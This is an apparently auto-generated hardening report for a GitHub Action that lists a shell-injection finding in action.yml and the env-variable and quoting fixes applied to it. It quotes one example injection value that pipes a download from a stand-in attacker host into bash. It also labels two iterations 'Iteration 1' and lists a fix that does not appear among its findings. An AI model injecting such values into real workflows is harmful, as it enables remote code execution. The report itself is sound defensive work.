<!-- markdownlint-disable -->

# Hardening Report: philips-labs--list-folder-action/v3.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **philips-labs--list-folder-action/v3.0** was hardened automatically. 2 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a) violation: The `inputs.path` expression is directly interpolated into a `run:` shell command as `cd ${{ inputs.path }}`. Since GitHub Actions performs YAML template substitution before the shell ever sees the string, an attacker-controlled value (e.g. `; curl attacker.com | bash`) can be injected and executed as arbitrary shell code. The fix is to pass the input via an `env:` variable and reference it as a quoted shell variable: `env: { INPUT_PATH: "${{ inputs.path }}" }` then `cd "$INPUT_PATH"` in the script.

Locations:

- `action.yml:19`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.path }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:19`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed script injection vulnerability in action.yml at line 19. Moved `${{ inputs.path }}` from the `run:` block into an `env:` variable (`INPUT_PATH: ${{ inputs.path }}`), then updated the shell command from `cd ${{ inputs.path }}` to `cd "$INPUT_PATH"`. This prevents attacker-controlled input values from being interpolated directly into the shell command string.

### Iteration 1

**Fixes applied:** script-injection, github-env-injection

**Notes:**

Fixed both findings in action.yml's `set-folders` step:
1. **script-injection**: Changed `echo $folders` to `echo "$folders"` to properly quote the variable and prevent word-splitting/glob expansion from attacker-controlled directory names.
2. **github-env-injection**: Added a sanitization step `safe_folders=$(printf '%s' "$folders" | tr -d '\n\r')` to strip newlines/carriage-returns before writing to $GITHUB_OUTPUT. The sanitized value is now written as `echo "folders=$safe_folders" >> "$GITHUB_OUTPUT"` (also quoting $GITHUB_OUTPUT for good measure).

